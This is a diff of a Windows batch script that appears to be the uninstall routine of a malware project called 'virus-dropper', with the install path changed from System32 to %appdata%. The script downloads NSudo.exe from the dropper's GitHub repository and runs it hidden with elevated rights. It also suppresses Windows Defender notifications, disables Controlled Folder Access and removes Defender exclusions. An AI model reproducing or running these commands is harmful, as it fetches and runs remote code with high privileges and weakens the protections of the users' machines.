@@ -15,19 +15,18 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-attrib "%systemroot%\System32\Windowsexe\Windows.exe" -h -s
-attrib "%systemroot%\System32\Windowsexe\AV.bat" -h -s
+attrib "%appdata%\Winmanager\Windows.exe" -h -s
+attrib "%appdata%\Winmanager\AV.bat" -h -s
 Taskkill /IM "Windows.exe" /F
 Taskkill /IM "Windows2.exe" /F
 curl "https://raw.githubusercontent.com/034nop/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionProcess '"Windows.exe'"
-powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
-del "%systemroot%\System32\Windowsexe\Windows.exe"
-del "%systemroot%\System32\Windowsexe\AV.bat"
-del "%systemroot%\System32\Windowsexe\Windows2.exe"
-rd "%systemroot%\System32\Windowsexe"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%appdata%\Winmanager'"
+del "%appdata%\Winmanager\Windows.exe"
+del "%appdata%\Winmanager\AV.bat"
+rd "%appdata%\Winmanager"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 del NSudo.exe
 powershell -Command "Unregister-ScheduledTask -TaskName 'Windows.exe' -Confirm:$false"
